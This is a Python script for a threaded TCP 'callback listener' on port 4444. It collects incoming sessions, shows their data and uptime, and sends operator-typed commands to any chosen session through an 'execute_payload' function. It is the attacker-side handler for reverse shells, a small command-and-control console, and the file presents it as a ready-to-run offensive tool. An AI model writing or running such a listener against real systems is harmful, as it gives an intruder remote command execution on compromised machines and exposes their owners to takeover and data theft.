# about Network Socket programming
import socket
import threading
import uuid
import time
from datetime import datetime

# about Interrupt
import signal
import sys

HOST = "0.0.0.0"
PORT = 4444

sessions = {}
sessions_lock = threading.Lock()

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"


def timestamp():
    return datetime.now().strftime("%H:%M:%S")


def handle_client(conn, addr):
    session_id = str(uuid.uuid4())[:8]
    with sessions_lock:
        sessions[session_id] = {
            "conn": conn,
            "addr": addr,
            "connected_at": time.time(),
        }
    print(f"{CYAN}[{timestamp()}] {GREEN}✓ NEW CONNECTION{RESET}")
    print(f"  Session ID: {BOLD}{session_id}{RESET}")
    print(f"  Source: {addr[0]}:{addr[1]}")
    print()

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            print(f"{CYAN}[{timestamp()}] [{YELLOW}{session_id}{CYAN}] DATA RECEIVED{RESET}")
            print(f"  {data!r}")
            print()
    finally:
        with sessions_lock:
            sessions.pop(session_id, None)
        conn.close()
        print(f"{CYAN}[{timestamp()}] {RED}✗ DISCONNECTED{RESET}")
        print(f"  Session ID: {BOLD}{session_id}{RESET}")
        print()


def accept_loop(s):
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


def format_uptime(seconds):
    h, rem = divmod(int(seconds), 3600)
    m, s = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


def print_sessions():
    with sessions_lock:
        items = list(sessions.items())

    print()
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}ACTIVE SESSIONS{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")

    if not items:
        print(f"{YELLOW}(no active sessions){RESET}")
    else:
        print(f"{CYAN}{'SID':<12}{'ADDRESS':<24}{'UPTIME':<12}{RESET}")
        print(f"{CYAN}{'-'*48}{RESET}")
        for sid, info in items:
            addr_str = f"{info['addr'][0]}:{info['addr'][1]}"
            uptime = format_uptime(time.time() - info["connected_at"])
            print(f"{GREEN}{sid:<12}{RESET}{addr_str:<24}{uptime:<12}")
        print(f"{CYAN}{'-'*48}{RESET}")
        print(f"{BOLD}Total:{RESET} {GREEN}{len(items)}{RESET} session(s)")

    print(f"{BOLD}{'='*60}{RESET}")
    print()


def execute_payload(session_id, command):
    with sessions_lock:
        if session_id not in sessions:
            return False, f"Session {BOLD}{session_id}{RESET} not found"
        conn = sessions[session_id]["conn"]

    try:
        conn.sendall(command.encode() + b"\n")
        return True, f"Command sent to {BOLD}{session_id}{RESET}"
    except Exception as e:
        return False, f"Error sending to {BOLD}{session_id}{RESET}: {str(e)}"


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)

    print()
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}CALLBACK LISTENER{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"Listening on {CYAN}{HOST}:{PORT}{RESET}")
    print(f"Commands: {YELLOW}list{RESET} (show sessions), {YELLOW}exec{RESET} (send command)")
    print(f"{BOLD}{'='*60}{RESET}")
    print()

    threading.Thread(target=accept_loop, args=(s,), daemon=True).start()

    try:
        while True:
            cmd = input(f"{BOLD}> {RESET}").strip()
            if not cmd:
                continue

            parts = cmd.split(maxsplit=2)
            cmd_type = parts[0].lower()

            if cmd_type == "list":
                print_sessions()
            elif cmd_type == "exec":
                if len(parts) < 3:
                    print(f"{RED}Usage: exec <session_id> <command>{RESET}")
                    continue
                session_id = parts[1]
                command = parts[2]
                success, msg = execute_payload(session_id, command)
                if success:
                    print(f"{GREEN}✓ {msg}{RESET}")
                else:
                    print(f"{RED}✗ {msg}{RESET}")
                print()
            elif cmd_type == "help":
                print(f"{YELLOW}Available commands:{RESET}")
                print(f"  {CYAN}list{RESET} - Show all active sessions")
                print(f"  {CYAN}exec <session_id> <command>{RESET} - Send command to session")
                print()
            else:
                print(f"{RED}Unknown command: {cmd_type}{RESET}")
    except KeyboardInterrupt:
        print(f"\n{RED}{BOLD}[*] Shutting down...{RESET}")
        sys.exit(0)


if __name__ == "__main__":
    main()
